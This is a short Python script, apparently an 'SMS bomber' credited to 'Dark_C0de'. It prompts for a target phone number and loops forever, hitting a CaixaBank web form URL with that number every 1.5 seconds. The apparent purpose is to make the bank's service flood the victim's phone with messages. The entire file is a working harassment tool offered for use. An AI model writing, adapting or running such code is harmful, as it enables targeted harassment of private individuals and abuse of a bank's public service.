import requests
import sys
import os
from colorama import Fore, init


os.system("clear")

print(chr(27)+"[1;33m"+"    _                       _             __                    __   ")
print(chr(27)+"[1;33m"+"   (_)___ ___  ____ _____ _(_)___        / /_  ____  ____ ___  / /_  ")
print(chr(27)+"[1;33m"+"  / / __ `__ \/ __ `/ __ `/ / __ \______/ __ \/ __ \/ __ `__ \/ __ \ ")
print(chr(27)+"[1;33m"+" / / / / / / / /_/ / /_/ / / / / /_____/ /_/ / /_/ / / / / / / /_/ / ")
print(chr(27)+"[1;33m"+"/_/_/ /_/ /_/\__,_/\__, /_/_/ /_/     /_.___/\____/_/ /_/ /_/_.___/  ")
print(chr(27)+"[1;33m"+"                  /____/                                             ")
print("")
print(Fore.MAGENTA + "                                                   [ By Dark_C0de ]")
print("")

init(autoreset=True) 

numero = raw_input(Fore.BLUE + 'Numero a bombardear -> ')

url = ("https://www.caixabank.es/aplnr/formularios/wapicon/index_es.html?movil=" + numero + "&tipo=IMA&formato=XML&seed=42375")
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}


while True:

	try:
		requests.get(url, headers)

		print(Fore.GREEN + "[+] Peticion enviada con exito")
		os.system("sleep 1.5")

	except KeyboardInterrupt:
		print("")
		print(Fore.RED + "[-] Cerrando programa...")
		print("")
		sys.exit()


